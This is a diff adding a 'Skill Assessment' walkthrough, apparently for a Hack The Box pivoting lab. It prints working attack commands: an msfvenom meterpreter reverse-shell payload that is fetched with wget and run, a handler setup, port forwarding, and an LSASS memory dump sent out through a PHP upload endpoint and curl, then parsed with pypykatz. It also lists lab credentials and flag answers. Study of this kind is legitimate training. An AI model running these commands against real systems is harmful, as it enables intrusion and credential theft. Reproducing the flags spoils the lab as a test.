@@ -18,6 +18,7 @@
     3. [ICMP Tunneling with SOCKS](#icmp-tunneling-with-socks)
 5. [Double Pivots](#double-pivots)
     1. [RDP and SOCKS Tunneling with SocksOverRDP](#rdp-and-socks-tunneling-with-socksoverrdp)
+6. [Skill Assesment](#skill-assesment)
 
 ## Introduction
 ### Challenges
@@ -312,3 +313,123 @@
     ![alt text](Assets/Double2.png)
 
     The answer is `H0pping@roundwithRDP!`.
+
+## Skill Assesment
+1. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.
+
+    We can explore from the root and check home directory. Then we can find administrator and webadmin directory in there. In the webadmin, we can find id_rsa and for-admin-eyes-only files. So the answer is `webadmin`.
+
+2. Submit the credentials found in the user's home directory. (Format: user:password)
+
+    The for-admin-eyes-only file contain user and password. The answer is `mlefay:Plain Human work!`.
+
+3. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.
+
+    To solve this, we can do ping sweeping by using `msfvenom` and `msfconsole`. First, we set up the payload.
+
+    ```bash
+    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.131 -f elf -o backupjob LPORT=8080
+    ```
+    Then transfer `backupjob`, we can use python to do file transfer.
+    
+    ```bash
+    python3 -m http.server 8000
+    ```
+    After that, we can set up `msfconsole`.
+
+    ```bash
+    [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+    [*] Using configured payload generic/shell_reverse_tcp
+    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
+    lhost => 0.0.0.0
+    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
+    lport => 8080
+    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter/reverse_tcp
+    payload => linux/x64/meterpreter/reverse_tcp
+    [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+    ```
+    In the target shell, we can use `wget` to get the `backupjob`. After that use `chmod +x` and execute it. Our listener will catch the connection and we will get meterpreter session. In there, we can use `ping_sweep` module.
+
+    ```bash
+    (Meterpreter 1)(/tmp) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+    ```
+    ![alt text](Assets/SA1.png)
+
+    The answer is `172.16.5.35`.
+
+4. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
+
+    In here, i prefer to stop `server/socks_proxy` session and use `portfwd add -l 3389 -p 3389 -r 172.16.5.35` on the meterpreter session.
+
+    ```bash
+    [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> jobs
+
+    Jobs
+    ====
+
+    Id  Name                           Payload  Payload opts
+    --  ----                           -------  ------------
+    0   Auxiliary: server/socks_proxy
+
+    [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> stop 0
+    [-] Unknown command: stop. Run the help command for more details.
+    [msf](Jobs:1 Agents:1) auxiliary(scanner/portscan/tcp) >> kill 0
+    [*] Stopping the following job(s): 0
+    [*] Stopping job 0
+    [*] Stopping the SOCKS proxy server
+    [msf](Jobs:0 Agents:1) auxiliary(scanner/portscan/tcp) >> sessions -i 1
+    [*] Starting interaction with 1...
+
+    (Meterpreter 1)(/tmp) > portfwd add -l 3389 -p 3389 -r 172.16.5.35
+    [*] Forward TCP relay created: (local) :3389 -> (remote) 172.16.5.35:3389
+    (Meterpreter 1)(/tmp) > bg
+    [*] Backgrounding session 1...
+    [msf](Jobs:0 Agents:1) auxiliary(scanner/portscan/tcp) >> 
+    ```
+    Then we can rdp to our attack machine.
+
+    ```bash
+    xfreerdp /v:127.0.0.1 /u:mlefay /p:'Plain Human work!'
+    ```
+    The answer is `S1ngl3-Piv07-3@sy-Day`.
+
+4. In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?
+
+    To do this, we need to transer `lsass.dmp` from windows target to the our attack host. We can use php to do file transfer. In our pivot host, we can set this php script.
+
+    ```bash
+    echo '<?php $f = fopen("lsass.dmp", "w"); fwrite($f, file_get_contents("php://input")); fclose($f); ?>' > /tmp/up.php
+    php -S 0.0.0.0:9090
+    ```
+
+    Then we can upload it using curl from powershell administrator previllege.
+
+    ```powershell
+    curl.exe --data-binary "@C:\Users\mlefay\Desktop\lsass.dmp" -X POST http://172.16.5.15:9090/up.php
+    ```
+    To check file integrty, we can use md5sum. After that, we can transfer `lsass.dmp` from pivot host to our attack host.
+
+    ```bash
+    (Meterpreter 1)(/tmp) > download /tmp/lsass.dmp /home/htb-ac-1395791/lsass.dmp
+    ```
+
+    To exctract `lsass.dmp`, we can use `pypykatz lsa minidump /home/htb-ac-1395791/lsass.dmp` tools.
+
+    ![alt text](Assets/SA2.png)
+
+    We can see  user `vfrank` password in there, `Imply wet Unmasked!`. So the answer is `vfrank`. 
+
+5. For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.
+
+    If we check `ipconfig` in the rdp session, we will notice its a multi homed. It shows that it has connection to `172.16.6.*`. So we do ping sweeping again.
+
+    ```powershell
+    1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
+    ```
+    ![alt text](Assets/SA3.png)
+
+    We found 3 IP. We can rdp to the 172.16.6.25 with vfrank credential. Then go to c folder. In there we can find the flag. The answer is `N3tw0rk-H0pp1ng-f0R-FuN`. 
+
+6. Submit the contents of C:\Flag.txt located on the Domain Controller.
+
+    Still in the vfrank rdp session. We can check domain control admin. In there we can find the flag. The answer is `3nd-0xf-Th3-R@inbow!`.
